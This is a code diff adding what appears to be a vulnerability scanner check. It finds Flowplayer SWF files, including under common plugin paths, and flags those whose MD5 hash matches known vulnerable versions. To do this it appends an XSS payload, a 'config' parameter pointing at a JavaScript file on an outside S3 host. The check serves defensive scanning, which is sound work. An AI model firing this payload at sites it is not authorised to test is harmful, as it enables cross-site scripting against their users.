@@ -1,0 +1,98 @@
+#include helpers.inc;
+#include string_helpers.inc;
+// directories to be tested
+var dirs    = new Array();
+var hashes  = new Array();
+// known vulnerable hashes
+hashes.push("cca02bb826eaea91caa7bd2ef742eb2a");
+hashes.push("c5bdfc2a3b626f95581110f7748b1040");
+hashes.push("3670090a0f12fc7e76c22949cba94867");
+hashes.push("b3af16f219abe6d17c0318d3d811e586");
+hashes.push("1200388e96b154ec9335b45845803a7a");
+hashes.push("f09e9408e59396dc3be7619a40b95b45");
+hashes.push("a39af4dcb48ea55950ce81e181264778");
+var lastJob = null;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+	
+	AddReportItem(ri);	
+}							 			
+/***********************************************************************************/
+function testSWFOnDir(dir)
+{
+	//trace(dir);
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = scanURL;
+    var exploit = "?config=https://s3-us-west-2.amazonaws.com/bxss/fp.js";
+    // we could have a directory like /zeroclipboard or a full path like /zeroclipboard/ZeroClipboard.swf
+	if (dir.endsWith(".swf"))
+        lastJob.uri  = dir + exploit;
+    else
+        lastJob.uri  = dir + "/flowplayer.swf" + exploit;
+	lastJob.execute();
+	
+	if (!lastJob.wasError && !lastJob.notFound) 
+	{
+		if (lastJob.responseStatus == 200)
+		{
+            hash = plain2md5(lastJob.response.body);
+            //trace(hash);
+            
+            if (hashes.indexOf(hash) != -1) {
+                alert(lastJob.uri.replace(exploit, ""), 'flowplayer_SWF_XSS.xml', lastJob);
+            }
+		}
+	}
+	return false;
+}
+/***********************************************************************************/
+function prepareDirectoriesToBeTested(list)
+{	
+	for (var i=0;i<list.count; i++){
+		var sf = list.getFile(i);		
+		
+		if(!sf.notFound && !sf.ignored && sf.scanSiteFile && sf.isFile)
+		{
+			dirName = sf.fullPath;			
+			if (sf.Name.match(/flowplayer.*?.swf/i))
+			{
+				if (dirs.indexOf(dirName) == -1)
+				    dirs.push(dirName);
+			}
+		}
+	}
+    
+    var tested_common_dirs = getGlobalValue("flowplayer_swf_tested_common_dirs");
+    if (!tested_common_dirs)
+    {
+	    SetGlobalValue("flowplayer_swf_tested_common_dirs", 1, true);
+        dirs.push("/images");
+		dirs.push("/media");
+        dirs.push("/videoPlayer");
+        dirs.push("/plugins/flowplayer");
+        dirs.push("/DesktopModules/EasyDNNRotator/flowplayer");
+        dirs.push("/wp-content/plugins/fv-wordpress-flowplayer/flowplayer");
+        dirs.push("/classes/flowplayer");
+        dirs.push("/lib/flowplayer");
+        dirs.push("/flash/flowplayer");
+        dirs.push("/swf/flowplayer");
+        dirs.push("/js/flowplayer");
+        dirs.push("/sites/all/modules/flowplayer/flowplayer");
+    }
+}
+/***********************************************************************************/
+/* main entry point */
+var list = getNewFiles(0);
+prepareDirectoriesToBeTested(list);
+if (dirs.length > 0) 
+{
+	for (var i=0; i<dirs.length; i++)
+		testSWFOnDir(dirs[i]);
+}
